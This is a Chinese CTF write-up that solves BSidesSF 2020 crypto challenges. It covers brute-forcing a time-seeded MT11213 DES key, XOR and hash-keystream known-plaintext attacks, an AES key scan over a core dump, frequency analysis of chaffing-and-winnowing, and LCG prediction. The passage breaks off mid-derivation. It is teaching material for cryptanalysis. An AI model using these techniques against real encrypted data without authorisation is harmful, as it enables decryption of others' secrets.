> 原文链接: https://www.anquanke.com//post/id/200545 


# 分析BSidesSF CTF 2020中Crypto方向题目


                                阅读量   
                                **654579**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01111f101acd9d159d.png)](https://p4.ssl.qhimg.com/t01111f101acd9d159d.png)



## 前言

在BSidesSF CTF 2020中有9道Crypto相关的题目，题目整体难度适中，在这里对这9道题目进行一下分析。



## chameleon

题目描述：<br>
Somebody encrypted our flag and lost the key! Can you decrypt it? We’ve included the encryption utility, it should come in handy!<br>
Note: The file was encrypted in the past few months. We don’t have a more specific date.

题目附件：<br>[chameleon.exe](https://github.com/ichunqiu-resources/anquanke/blob/master/009/chameleon/chameleon.exe)<br>[flag.png.enc](https://github.com/ichunqiu-resources/anquanke/blob/master/009/chameleon/flag.png.enc)

用IDA加载本题的exe程序，发现程序去除了符号表，在main函数的最后可以找到encrypt和decrypt函数，我们跟进encrypt函数看一下：

```
void __usercall sub_401FC0(const CHAR *a1@&lt;ebx&gt;)
`{`
  void *v1; // eax
  BYTE *v2; // esi
  FILE *v3; // eax
  DWORD pdwDataLen; // [esp+4h] [ebp-2Ch]
  HCRYPTKEY phKey; // [esp+8h] [ebp-28h]
  HCRYPTPROV phProv; // [esp+Ch] [ebp-24h]
  BYTE pbData; // [esp+10h] [ebp-20h]
  char v8; // [esp+11h] [ebp-1Fh]
  __int16 v9; // [esp+12h] [ebp-1Eh]
  int v10; // [esp+14h] [ebp-1Ch]
  int v11; // [esp+18h] [ebp-18h]
  int v12; // [esp+1Ch] [ebp-14h]
  int v13; // [esp+20h] [ebp-10h]
  int v14; // [esp+24h] [ebp-Ch]
  int v15; // [esp+28h] [ebp-8h]

  v1 = (void *)sub_401EA0(&amp;pdwDataLen);
  v2 = (BYTE *)realloc(v1, pdwDataLen + 16);
  if ( !CryptAcquireContextA(&amp;phProv, 0, "Microsoft Enhanced Cryptographic Provider v1.0", 1u, 0xF0000000) )
    goto LABEL_9;
  sub_401A10((int)&amp;v14);
  v9 = 0;
  pbData = 8;
  v11 = 8;
  v12 = v14;
  v13 = v15;
  v8 = 2;
  v10 = 26113;
  if ( !CryptImportKey(phProv, &amp;pbData, 0x14u, 0, 1u, &amp;phKey)
    || !CryptEncrypt(phKey, 0, 1, 0, v2, &amp;pdwDataLen, pdwDataLen + 8) )
  `{`
LABEL_9:
    v3 = _iob_func();
    fprintf(v3 + 2, "Encryption failedn");
    exit(1);
  `}`
  sub_401AA0((int)&amp;v14);
  sub_401F50(a1, v2, pdwDataLen);
  free(v2);
`}`
```

可以看到程序调用了CryptAcquireContextA、CryptImportKey、CryptEncrypt等API，查阅[API手册](https://docs.microsoft.com/en-us/windows/win32/seccrypto/example-c-program--importing-a-plaintext-key)可以看到这里程序使用DES-CBC进行加密，key来自sub_401A10函数，那么我们接下来跟进sub_401A10函数来看一下：

```
char __usercall sub_401A10@&lt;al&gt;(int a1@&lt;edi&gt;)
`{`
  __time64_t v1; // rax
  signed int v2; // ecx
  unsigned int v3; // esi

  v1 = time64(0);
  v2 = 0;
  do
  `{`
    LODWORD(v1) = 29945647 * v1 - 1;
    dword_404380[v2++] = v1;
  `}`
  while ( v2 &lt; 351 );
  dword_404018 = v2;
  v3 = 0;
  do
  `{`
    LOBYTE(v1) = sub_401870(v2, HIDWORD(v1)) ^ 0x55;
    *(_BYTE *)(v3++ + a1) = v1;
  `}`
  while ( v3 &lt; 8 );
  return v1;
`}`
```

这里看到`v1 = time64(0)`，结合题目描述，看起来像是使用系统时间在设置种子，第一个循环根据种子来设置数组，我们继续跟进sub_401870函数来看一下：

```
int sub_401870()
`{`
  int v0; // eax
  int v1; // eax
  unsigned int *v2; // ecx
  unsigned int v3; // esi
  int v4; // eax
  unsigned int v5; // edi
  unsigned int v6; // esi
  int v7; // eax
  unsigned int v8; // esi
  unsigned int v9; // edi
  int v10; // eax
  unsigned int v11; // edi
  unsigned int v12; // esi
  int v13; // eax
  unsigned int v14; // esi
  unsigned int v15; // ecx
  int v16; // ecx

  v0 = dword_404018;
  if ( dword_404018 &gt;= 351 )
  `{`
    v1 = 175;
    v2 = (unsigned int *)&amp;unk_404384;
    do
    `{`
      v3 = *v2;
      v4 = v1 + 1;
      *(v2 - 1) = ((*(v2 - 1) ^ (*v2 ^ *(v2 - 1)) &amp; 0x7FFFF) &gt;&gt; 1) ^ dword_40437C[v4] ^ -((*((_BYTE *)v2 - 4) ^ (unsigned __int8)(*(_BYTE *)v2 ^ *((_BYTE *)v2 - 4))) &amp; 1) &amp; 0xE4BD75F5;
      if ( v4 &gt;= 351 )
        v4 = 0;
      v5 = v2[1];
      v6 = ((v3 ^ (v3 ^ v2[1]) &amp; 0x7FFFF) &gt;&gt; 1) ^ dword_404380[v4] ^ -(((unsigned __int8)v3 ^ (unsigned __int8)(v3 ^ *((_BYTE *)v2 + 4))) &amp; 1) &amp; 0xE4BD75F5;
      v7 = v4 + 1;
      *v2 = v6;
      if ( v7 &gt;= 351 )
        v7 = 0;
      v8 = v2[2];
      v9 = ((v5 ^ (v5 ^ v2[2]) &amp; 0x7FFFF) &gt;&gt; 1) ^ dword_404380[v7] ^ -(((unsigned __int8)v5 ^ (unsigned __int8)(v5 ^ *((_BYTE *)v2 + 8))) &amp; 1) &amp; 0xE4BD75F5;
      v10 = v7 + 1;
      v2[1] = v9;
      if ( v10 &gt;= 351 )
        v10 = 0;
      v11 = v2[3];
      v12 = ((v8 ^ (v8 ^ v2[3]) &amp; 0x7FFFF) &gt;&gt; 1) ^ dword_404380[v10] ^ -(((unsigned __int8)v8 ^ (unsigned __int8)(v8 ^ *((_BYTE *)v2 + 12))) &amp; 1) &amp; 0xE4BD75F5;
      v13 = v10 + 1;
      v2[2] = v12;
      if ( v13 &gt;= 351 )
        v13 = 0;
      v14 = ((v11 ^ (v11 ^ v2[4]) &amp; 0x7FFFF) &gt;&gt; 1) ^ dword_404380[v13] ^ -(((unsigned __int8)v11 ^ (unsigned __int8)(v11 ^ *((_BYTE *)v2 + 16))) &amp; 1) &amp; 0xE4BD75F5;
      v1 = v13 + 1;
      v2[3] = v14;
      if ( v1 &gt;= 351 )
        v1 = 0;
      v2 += 5;
    `}`
    while ( (signed int)v2 &lt; (signed int)&amp;dword_4048FC );
    dword_4048F8 = dword_404638 ^ ((dword_4048F8 ^ (dword_4048F8 ^ dword_404380[0]) &amp; 0x7FFFFu) &gt;&gt; 1) ^ -(((unsigned __int8)dword_4048F8 ^ (unsigned __int8)(dword_4048F8 ^ LOBYTE(dword_404380[0]))) &amp; 1) &amp; 0xE4BD75F5;
    v0 = 0;
  `}`
  v15 = dword_404380[v0];
  dword_404018 = v0 + 1;
  v16 = ((((v15 &gt;&gt; 11) ^ v15) &amp; 0xCABCA5) &lt;&lt; 7) ^ (v15 &gt;&gt; 11) ^ v15;
  return (unsigned __int8)(v16 ^ ((((v16 &amp; 0xFFFFFFAB) &lt;&lt; 15) ^ v16) &gt;&gt; 17));
`}`
```

这里较多计算都涉及到了常数0xE4BD75F5，检索一下这个常数，可以找到[这段代码](http://www.ai.mit.edu/courses/6.836-s03/handouts/sierra/random.c)，可以看到程序这里是模拟了一个类似梅森旋转的伪随机数生成器，但是并不是MT19937，许多地方做了修改，比如循环次数不是624而是351，常数不是0x9908B0DF而是0xE4BD75F5，继续查找资料，在[这篇文章](https://hal.archives-ouvertes.fr/hal-02182827/document)中发现这里使用的是MT11213：

```
"MT11213" with a period of 211213 − 1 that has w = 32, N = 351, m =
175, c = 19, and a = 0xE4BD75F5 as recurrence parameters, and c1 =
0x655E5280, c2 = 0xF F D58000, b1 = 11, b2 = 7, b3 = 15, and b4 = 17
265 for tempering ones

"MT19937", which has a period of 219937 − 1, has w = 32, N = 624,
m = 397, c = 31, and a = 0x9908B0DF as recurrence parameters, and
c1 = 0x9D2C5680, c2 = 0xEF C60000, b1 = 11, b2 = 7, b3 = 15, and
b4 = 18] for Tempering ones.
```

既然如此，题目说文件是过去的几个月以来加密的，但是具体时间并不知道，比赛时间为23 Feb. 2020, 17:00 UTC，我们可以尝试在一个小范围内爆破这一日期，例如从2020-02-01 00:00:00起，至2020-02-23 00:00:00止，产生若干密钥依次来尝试解密，由于我们的原始文件为flag.png，根据PNG文件格式，解密成功的情况下其前8个字节应为x89x50x4ex47x0dx0ax1ax0a，我们可以以此来作为密钥是否正确的标志，随后使用该密钥进行解密即可，将上述推导过程写成代码形式如下：

```
#include &lt;math.h&gt;
#include &lt;stdio.h&gt;

#define RAND_MASK 0x3FFFFFFF

#define N 351
#define M 175
#define R 19
#define TEMU 11
#define TEMS 7
#define TEMT 15
#define TEML 17

#define MATRIX_A 0xE4BD75F5
#define TEMB         0x655E5280
#define TEMC         0xFFD58000

static unsigned int mt[N];
static int mti=N;

extern void set_seed (int seed) `{`
    unsigned int s = (unsigned int)seed;
    for (mti=0; mti&lt;N; mti++) `{`
        s = s *    29945647 - 1;
        mt[mti] = s;
    `}`
    return;
`}`

int genrandom () `{`
    unsigned int y;
    if (mti &gt;= N) `{`
        const unsigned int LOWER_MASK = (1u &lt;&lt; R) - 1;
        const unsigned int UPPER_MASK = -1 &lt;&lt; R;
        int kk, km;

        for (kk=0, km=M; kk &lt; N-1; kk++) `{`
            y = (mt[kk] &amp; UPPER_MASK) | (mt[kk+1] &amp; LOWER_MASK);
            mt[kk] = mt[km] ^ (y &gt;&gt; 1) ^ (-(y &amp; 1) &amp; MATRIX_A);

            if (++km &gt;= N) km = 0;
        `}`

        y = (mt[N-1] &amp; UPPER_MASK) | (mt[0] &amp; LOWER_MASK);
        mt[N-1] = mt[M-1] ^ (y &gt;&gt; 1) ^ (-(unsigned int)(y &amp; 1) &amp; MATRIX_A);
        mti = 0;
    `}`
    y = mt[mti++];

    y ^=    y &gt;&gt; TEMU;
    y ^= (y &lt;&lt; TEMS) &amp; TEMB;
    y ^= (y &lt;&lt; TEMT) &amp; TEMC;
    y ^=    y &gt;&gt; TEML;

    return y&amp;0xff;
`}`

int main(void) `{`
    for (int t = 1580486400; t &lt; 1582387200; t++) `{`
        set_seed(t);
        for (int i = 0; i&lt;8; i++) `{`
            printf("%02x", genrandom() ^ 0x55);
        `}`
        printf("n");
    `}`
`}`
```

编译程序，然后将程序执行结果保存至keys.txt文件夹，接下来尝试进行解密：

```
from Crypto.Cipher import DES
import binascii

f1 = open('flag.png.enc', 'rb').read()
ct = f1

f2 = open('keys.txt', 'rb').read()
keys = f2.splitlines()

f3 = open('flag.png', 'wb')
for key in keys:
    key = binascii.unhexlify(key)
    if DES.new(key, DES.MODE_CBC, b'x00' * 8).decrypt(ct[:8]) == b'x89x50x4ex47x0dx0ax1ax0a':
        print("Found it!")
        print(key)
        pt = DES.new(key, DES.MODE_CBC, b'x00' * 8).decrypt(ct)
        f3.write(pt)
        break

f3.close()
```

执行代码后，可以看到最终密钥为b’xa0Qxb8xa1ox85Bxda’，打开生成的flag.png即可看到flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f6cc172c55e32cd6.png)



## decrypto-1

题目描述：<br>
Kerckhoffs’s principle states that “A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.” So here’s our unbreakable cipher.

题目附件：<br>[flag.txt.enc](https://github.com/ichunqiu-resources/anquanke/blob/master/009/decrypto-1/flag.txt.enc)<br>[decrypto.py](https://github.com/ichunqiu-resources/anquanke/blob/master/009/decrypto-1/decrypto.py)

审计一下源码，发现题目的加密经过了多个函数处理，整理一下可以表示为如下形式：

```
ct = (ceil(len(pt) / len(key)) * key)[:len(pt)] ^ pt
```

其中pt为``{`"filename":文件名, "hash":sha256(文件内容), "plaintext":文件内容`}``经过json.dumps函数处理后的形式，由于我们的加密后的文件的文件名为`flag.txt.enc`，因此可知原始文件的文件名为`flag.txt`，借此可以得到pt的前43字节的内容如下：

```
`{`n    "filename": "flag.txt",n    "hash": "

```

我们将该部分内容和密文的前43字节异或，得

```
&gt;&gt;&gt; pt_part = b'`{`n    "filename": "flag.txt",n    "hash": "'
&gt;&gt;&gt; ct_part = open('flag.txt.enc', 'rb').read()[:43]
&gt;&gt;&gt; bytes(a ^ b for a, b in zip(pt_part, ct_part))
b'n0t4=l4gn0t4=l4gn0t4=l4gn0t4=l4gn0t4=l4gn0t'
```

由于该部分的内容主要为若干个key的拼接，可知key为`n0t4=l4g`，接下来直接进行解密即可得到明文，从而得到flag：

```
&gt;&gt;&gt; ct = open('flag.txt.enc', 'rb').read()
&gt;&gt;&gt; key = b'n0t4=l4g'
&gt;&gt;&gt; truekey = b''
&gt;&gt;&gt; while len(truekey) &lt; len(ct):
...     truekey += key
... 
&gt;&gt;&gt; truekey = truekey[:len(ct)]
&gt;&gt;&gt; pt = bytes(a ^ b for a, b in zip(ct, truekey))
&gt;&gt;&gt; pt
b'`{`n    "filename": "flag.txt",n    "hash": "2f98b8afa014bf955533a3e72cee0417413ff744e25f2b5b5838f5741cd69547",n    "plaintext": "CTF`{`plz_dont_r0ll_ur_own_crypto`}`"n`}`'
```



## decrypto-2

题目描述：<br>
Kerckhoffs’s principle states that “A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.” So here’s our really unbreakable cipher.

题目附件：<br>[flag.svg.enc](https://github.com/ichunqiu-resources/anquanke/blob/master/009/decrypto-2/flag.svg.enc)<br>[decrypto.py](https://github.com/ichunqiu-resources/anquanke/blob/master/009/decrypto-2/decrypto.py)

审计一下源码，发现题目的加密经过了多个函数处理，整理一下可以表示为如下形式：

```
设:
blk0 = sha256(key + struct.pack('&lt;I', 0)).digest())
blk_i = sha256(blk_(i-1) + struct.pack('&lt;I', i)).digest())

则：
ct = (blk0 + blk1 + ... + blk_n)[:len(pt)] ^ pt
```

每个blk为sha256哈希值，即32字节长，如果我们能知道pt的前32个字节，将其异或上ct的前32个字节即可得到blk0，根据递推公式，有了blk0即可得到blk1，有了blk1即可得到blk2，以此类推，我们即可得到(blk0 + blk1 + … + blk_n)[:len(pt)]的值，将其和整个ct异或即可得到pt，因此接下来我们的任务就是想办法获取pt的前32个字节，鉴于加密的文件为svg格式，我们可以尝试一些svg常见的开头内容，取其前32个字节依次进行测试，本题中该svg文件前缀与[WIKI中SVG词条](https://en.wikipedia.org/wiki/Scalable_Vector_Graphics)下的SVG代码格式示例前缀相同：

```
from hashlib import sha256
import struct

prefix = b'&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;'
ct_part = open('flag.svg.enc', 'rb').read()[:32]
blk0 = bytes(a ^ b for a, b in zip(prefix[:32], ct_part))
blkset = blk0
ct = open('flag.svg.enc', 'rb').read()
count = 1
while len(blkset) &lt; len(ct):
    blkset += sha256(blkset[-32:] + struct.pack('&lt;I', count)).digest()
    count += 1

pt = bytes(a ^ b for a, b in zip(ct, blkset))
idx = pt.find(b'CTF')
print(pt[idx:])
```

在打印结果中即可获得flag：

```
b'CTF`{`but_even_I_couldnt_break_IT`}`&lt;/tspan&gt;&lt;/text&gt;n  &lt;/g&gt;n&lt;/svg&gt;n'
```



## decrypto-3

题目描述：<br>
Fine, I learned not to roll my own crypto. I hear OpenSSL is good and easy to use, so I’ll use that to encrypt my secrets. Unfortunately, I keep crashing. Can you help me figure out what the bug is?

题目附件：<br>[flag.txt.enc](https://github.com/ichunqiu-resources/anquanke/blob/master/009/decrypto-3/flag.txt.enc)<br>[crypto](https://github.com/ichunqiu-resources/anquanke/blob/master/009/decrypto-3/crypto)<br>[core](https://github.com/ichunqiu-resources/anquanke/blob/master/009/decrypto-3/core)

执行crypto程序尝试加密，可以看到程序提示Segmentation fault，我们对crypto程序进行逆向，可以看到程序没有去符号表，直接定位到setup_crypter函数：

```
__int64 __fastcall setup_crypter(__int64 a1)
`{`
  __int64 v1; // ST08_8
  __int64 v2; // rax
  void *v3; // ST18_8
  __int64 v4; // rax

  v1 = a1;
  *(_QWORD *)(a1 + 160) = HMAC_CTX_new();
  v2 = EVP_sha256();
  HMAC_Init_ex(*(_QWORD *)(v1 + 160), v1 + 64, 32LL, v2, 0LL);
  *(_QWORD *)(a1 + 168) = EVP_CIPHER_CTX_new();
  v3 = calloc(0x10uLL, 1uLL);
  v4 = EVP_aes_256_cbc(16LL, 1LL);
  return EVP_EncryptInit_ex(*(_QWORD *)(v1 + 168), v4, 0LL, v1 + 32, v3);
`}`
```

可以看到程序使用AES-256进行加密，v3为IV，在使用calloc函数分配内存空间后没有进行赋值，因此IV为`b'x00' * 16`，即calloc赋的初值，程序使用的key我们不知道，但题目把报错后的core dump的core文件提供给我们了，考虑到core文件通常包含程序运行时的内存，寄存器状态，堆栈指针，内存管理信息等，我们可以考虑遍历core文件来从中寻找密钥，AES-256使用32字节长的密钥，因此我们从`i=0`开始到`i=len(ct)-32`为止，不断把core[i:i+32]的内容当做key来进行解密，如果解密的内容中包含’CTF’，即视为解密成功。

将上述推导过程写成代码形式如下：

```
from Crypto.Cipher import AES

f = open('core', 'rb').read()
ct = open('flag.txt.enc', 'rb').read()
iv = b'x00' * 16

for i in range(len(f) - 32):
    key = f[i:i+32]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)
    if b'CTF' in pt:
        print(pt)
        break
```

执行代码即可在pt中找到flag：

```
b'PR_SET_DUMPABLE (since Linux 2.3.20)nSet the state of the "dumpable"nflag, which determines whether core dumps are produced for the calling processnupon delivery of a signal whose default behavior is to produce a core dump.nnMADV_DONTDUMP (since Linux 3.4)nExclude from a core dump those pages in the range specified by addr and length.nThis is useful in applications that have large areas of memory that are knownnnot to be useful in a core dump. The effect of MADV_DONTDUMP takes precedencenover the bit mask that is set via the /proc/PID/coredump_filter file (seencore(5)).nnnMan, if only I'd known about those options before I dumped core and sent it out.nnCTF`{`core_dump_your_secrets`}`nx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fwRxd7/?x83xdcx15Yxb1(rx19x1axe7x86xc4ZmLx87xe9x00xb0P`{`4Hxb8`}`x03x8a'
```



## eccmul

题目描述：<br>
Never done ECC before? Now you can!<br>
eccmul-3e426cd0.challenges.bsidessf.net:25519

题目只给了一个服务器地址和端口，nc连接上去看一下：

```
Curve Generated: y^2 = x^3 + 3538569901*x + 1463263163 mod 12382431221540560483
Point `P` on curve: [7446047202987944211,10385346314533718897]
Scalar `s`: 7780639736
Please compute `R` = `s*P`

R? (enter in form [1234,5678])&gt;
```

给定曲线、点P、标量s，要求给出s*P，直接在SageMath下计算即可：

```
sage: a = 3538569901
sage: b = 1463263163
sage: n = 12382431221540560483
sage: E = EllipticCurve(GF(n), [a,b])
sage: P = E([7446047202987944211,10385346314533718897])
sage: s = 7780639736
sage: R = s*P
sage: R
(611642810769681786 : 2794026609502217488 : 1)
```

提交至服务器即可得到flag：

```
R? (enter in form [1234,5678])&gt; [611642810769681786,2794026609502217488]
Great!
CTF`{`babys_first_scalar_multiplication`}`
```



## haystack

题目描述：<br>
This vendor claims they have figured out a way to preserve the integrity and confidentiality of a message using signing instead of encryption. We only have a binary pycache file and a message off the wire — can you find the content of the message?

题目附件：<br>[chaffing.pyc](https://github.com/ichunqiu-resources/anquanke/blob/master/009/haystack/chaffing.pyc)<br>[message.pcap](https://github.com/ichunqiu-resources/anquanke/blob/master/009/haystack/message.pcap)

题目给了一个pyc文件和一个流量包，我们可以先使用uncompyle6来反编译一下pyc文件：

```
uncompyle6 chaffing.pyc &gt; chaffing.py
```

这段反编译出来的代码在python2/3中关于str和bytes的用法上出现了一些混用，我们将其统一修改为python3的版本，整理后chaffing.py文件的内容如下：

```
import hmac
import hashlib
import random
import struct


CHAFF_SIZE = 32
SIG_SIZE = 16
ALL_BYTES = set(c for c in range(256))
KEY = b'af5f76f605a700ae8c0895c3e6175909'


def byte(v):
    return bytes([v])


def sign_byte(val, key):
    return hmac.new(
            key, val, digestmod=hashlib.sha256).digest()[:SIG_SIZE]


def chaff_byte(val, key):
    msgs = `{``}`
    msgs[val[0]] = sign_byte(val, key)
    while len(msgs) &lt; CHAFF_SIZE:
        vals = list(ALL_BYTES - set(msgs.keys()))
        c = random.choice(vals)
        if c == val:
            raise ValueError('Chose duplicate!')
        fake_sig = bytes(random.choices(list(ALL_BYTES), k=SIG_SIZE))
        msgs[c] = fake_sig
    pieces = []
    for k, v in msgs.items():
        pieces.append(b'%s%s' % (byte(k), v))
    random.shuffle(pieces)
    return b''.join(pieces)


def chaff_msg(val, key):
    if not isinstance(val, bytes):
        val = val.encode('utf-8')
    msg_out = []
    for b in val:
        msg_out.append(chaff_byte(byte(b), key))
    outval = b''.join(msg_out)
    return struct.pack('&gt;I', len(val)) + outval


def winnow_msg(val, key):
    if not isinstance(val, bytes):
        val = val.encode('utf-8')
    msglen = struct.unpack('&gt;I', val[:4])[0]
    val = val[4:]
    chunk_len = (SIG_SIZE + 1) * CHAFF_SIZE
    expected_len = chunk_len * msglen
    if len(val) != expected_len:
        raise ValueError(
                'Expected length %d, saw %d.' % (expected_len, len(val)))
    pieces = []
    for c in range(msglen):
        chunk = val[chunk_len*c:chunk_len*(c+1)]
        res = winnow_byte(chunk, key)
        pieces.append(res)
    return b''.join(pieces)


def winnow_byte(val, key):
    while val:
        c = byte(val[0])
        sig = val[1:SIG_SIZE+1]
        if sign_byte(c, key) == sig:
            return c
        val = val[SIG_SIZE+1:]
    raise ValueError('No valid sig found!')


def main():
    inp = b'This is a test message!'
    msg = chaff_msg(inp, KEY)
    ret = winnow_msg(msg, KEY)
    if inp != ret:
        print('Wrong ret: %s' % ret)


if __name__ == '__main__':
    main()
```

这里的chaff和winnow函数实际上是指代密码学领域当中的一种技术[Chaffing and winnowing](https://en.wikipedia.org/wiki/Chaffing_and_winnowing)，其中chaff表示谷壳，winnow表示风选，这里的名字来源于农业中：人们收获谷物并对其进行脱粒后，仍然有一些部分和不可食用的谷壳混合在一起，为了分开并去除这些杂质，人们利用物料与杂质之间悬浮速度的差别，借助风力来除杂，这一过程称为风选，分开后的谷壳部分就可以被丢弃了。这一过程和我们这里的过程很相似：

```
1. 假设Alice和Bob两人进行通信，两人协商好使用某一key作为密钥。
2. 假设Alice想要向Bob发送消息，Alice首先对其想要发送的消息的第一个字节（假设为字节1）使用hmac with sha256（hmac使用协商好的key）计算出一个签名并取该签名的前16个字节作为签名值，记录下`{`字节1的值:签名值`}`。
3. Alice随机生成一个不同于字节1的字节，然后随机生成16个字节作为签名值，记录下`{`随机字节，随机签名`}`，重复31次该操作，共得到31个`{`随机字节，随机签名`}`。
4. 将`{`字节1的值:签名值`}`和31个`{`随机字节，随机签名`}`放在一起并打乱顺序，然后以bytes形式拼接，作为字节1的处理结果。
5. Alice对想要发送的后续字节（字节2、字节3、...、字节n）依次进行上述处理，然后以bytes形式拼接，作为要发送的消息的处理结果，最后把要发送的消息的长度padding成4个字节，拼接在要发送的消息的处理结果的最前面作为最终结果进行发送。
6. Bob收到这一结果后，对其中第一组的32个`{`字节：签名`}`对，使用协商好的key计算其中每一个字节的签名，哪一个字节计算出的签名值和该字节在`{`字节：签名`}`对中对应的签名值相同，则说明Alice发送的第一个字节为该字节，依次类推，直到Bob恢复出所有字节，从而得到Alice想要发送的完整消息。
```

Alice向Bob发送的内容，我们可以从message.pcap中获取，使用wireshark打开pcap文件，追踪一个TCP流，将其内容dump出来，将其命名为message.dump（该文件见此[链接](https://github.com/ichunqiu-resources/anquanke/blob/master/009/haystack/message.dump)）。

我们现在的问题在于，我们并没有key，因此无法像Bob那样使用key来依次判断出Alice发送的消息是什么。但是这里有其他的漏洞点可以供我们利用，注意到这里在对每个字节计算签名时，没有引入类似计数器一类的概念去参与到签名的运算当中，导致相同字节的签名一直相同，比如以字节’a’为例，第一次计算其签名时，其结果为sig1，第N次计算其签名时，其结果仍为sig1，而本题中`消息的字节数=len(message.dump)//(32*17)=1421`，数量比较大，这就导致我们可以采用统计的方法进行攻击：对于消息的第一个字节的位置的32个`{`字节：签名`}`，我们可以在其他位置的若干个`{`字节：签名`}`当中，去查找有没有出现过这32个签名当中的某个签名，由于正确的签名是计算出来的而且该字节很有可能在消息中重复出现，而错误的签名是随机生成的，理论上不会再次出现，因此如果我们找到某一个签名在后面再次出现了，一定程度上就可以认为该签名对应的字节就是消息在这一位置的正确的字节。

将上述推导过程写成代码形式如下：

```
from Crypto.Util.number import *

f = open('message.dump', 'rb').read()[4:]

data = []
for i in range(0, len(f), 32*17):
    data.append(f[i:i+32*17])

data2 = [[] for _ in range(len(f)//(32*17))]
allres = []
count = 0
for item in data:
    l = []
    for i in range(0, len(item), 17):
        l.append(item[i:i+17])
    for j in l:
        c = j[0]
        sig = j[1:]
        data2[count].append((c, sig))
        allres.append((c, sig))
    count += 1

msg = []
for item in data2:
    for m in item:
        if allres.count(m) &gt; 1:
            msg.append(m)
            break

print(b''.join([long_to_bytes(item[0]) for item in msg]))

```

执行代码即可得到消息如下：

```
b'This message is encoded using a technique called "Chaffing and Winnowing"[1],na technique that was first published by Ron Rivest in an article published onnthe 18th of March 1998 (1998/03/18).  Unfortunately, my implementation of thentechnique suffers from very significant flaws, not the least of which is thenfailure to include a counter within the the MAC'd portion of the data.  Thisnleads to all valid bytes with the same value having the same MAC, which shouldnallow for a fairly trivial frequency analysis attack on the message.nUltimately, if you're reading this, then you've found *some* way to crack thenencoding applied here.nnChaffing and winnowing also leads to a pretty major blow up in size.  Imaginenif, instead of 31 bytes of chaff per byte of message, I had used the maximumn255.  Imagine that I used a 256-bit MAC instead of 128.  (256 bits: militaryngrade crypto!!@!)nnAt this point, you've been patient enough through my diatribe (which is reallynjust to give you the plaintext you need to launch your attack against the outputnof this encoding).  What you're really here for is the FLAG.  Like most of ournother flags, this is in the typical CTF`{``}` format.nnCTF`{`thanks_to_rivest_for_all_his_contributions`}`nn- Matir.n(@Matir, https://systemoverlord.com)nnGreetz to decreasedsales, dissect0r, poptart, ehntoo, illusorycake, andnzerobitsmith.nnn[1]: https://en.wikipedia.org/wiki/Chaffing_and_winnowingn'

```

在消息中我们找到flag：

```
CTF`{`thanks_to_rivest_for_all_his_contributions`}`
```



## mentalist

题目描述：<br>
Can you read the mind of a computer?<br>
mentalist-a05ae893.challenges.bsidessf.net:12345

题目只给了一个服务器地址和端口，nc连接上去看一下：

```
Welcome Chosen One! I have been waiting for you...
The legend fortold of one that could read minds.
If you can read my mind I will reveal my great knowledge.

What number am I thinking of?
```

本题要求我们预测服务器端产生的数字，但是我们没有源码，因此并不知道数字的生成规则，随便输入几个数字，发现每次的提示语句不一样，因此我们尝试不断提交来查看一共有多少提示语句：

```
What number am I thinking of? 0
Actually I was thinking of 935066503044, try again
What number am I thinking of? 0
No I'm sorry, I was thinking of 30146363867131
What number am I thinking of? 0
Hmmm no. My number was 18007953872258, are you sure you're okay?
What number am I thinking of? 0
I'm getting worried. I was thinking of 19185121492725; you're not doing so well.
What number am I thinking of? 0
I grow tired of your failures. My number was 12023741535832
What number am I thinking of? 0
Nope. 20750859143879 Perhaps you aren't the one I was waiting for?
What number am I thinking of? 0
WRONG! It was 23824254417666
What number am I thinking of? 0
My patience thins... 15032732667493 was my number
What number am I thinking of? 0
You're getting on my nerves. It was 3496124413160
What number am I thinking of? 0
I'm only going to give you one more chance. I was thinking of 13665285383967
What number am I thinking of? 0
I see now that you aren't who I was looking for.
It's too late now but I was thinking of 24221806267714
In case you were wondering how I was thinking of these numbers,
they were for the form x_n+1 = x_n * 2332350940921 + 523873619107 % 30550145125500
And my initial seed x_0 was 13240382517197
With this you can verify that I wasn't cheating.
Good luck in your future endeavors!
```

经过11次提交，我们发现服务器在最后一次提交后告诉了我们这些数字的生成规则和使用的参数值，可以得知题目使用了LCG伪随机数生成器来生成数字，但是与此同时服务器也切断了连接，下次再nc连接时，LCG生成器使用的参数值都会刷新，因此我们的任务就是通过一些LCG生成的值来恢复出所有参数的值，继而可以直接计算出后续的值，从而实现预测。

假设一个LCG模型为：

```
s_(i+1) ≡ s_i * m + c (mod n)
```

其中s0为种子，我们从服务器端获取的11个数字依次为s1到s11，我们需要恢复出m、c、n的值来计算出后续的值，首先我们来恢复n，考虑如下同余方程：

```
s2 ≡ s1 * m + c  (mod n)
s3 ≡ s2 * m + c  (mod n)
s4 ≡ s3 * m + c  (mod n)
s5 ≡ s4 * m + c  (mod n)
```

将同余式改写为等式，有：

```
s2 - (s1 * m + c) = k1 * n
s3 - (s2 * m + c) = k2 * n
s4 - (s3 * m + c) = k3 * n
s5 - (s4 * m + c) = k4 * n
```

设`t_i = s_(i+1) - s_i`，有：

```
t1 = s2 - s1
t2 = s3 - s2 = (s2 * m + c) + k2 * n - (s1 * m + c) - k1 * n = (s2 - s1) * m + (k3 - k2) * n = t1 * m + A * n
t3 = s4 - s3 = (s3 * m + c) + k3 * n - (s2 * m + c) - k2 * n = (s3 - s2) * m + (k4 - k3) * n = t2 * m + B * n
t4 = s5 - s4 = (s4 * m + c) + k4 * n - (s3 * m + c) - k3 * n = (s4 - s3) * m + (k5 - k4) * n = t3 * m + C * n
```

即：

```
t2 ≡ t1 * m (mod n)
t3 ≡ t2 * m (mod n) ≡ t1 * m^2 (mod n)
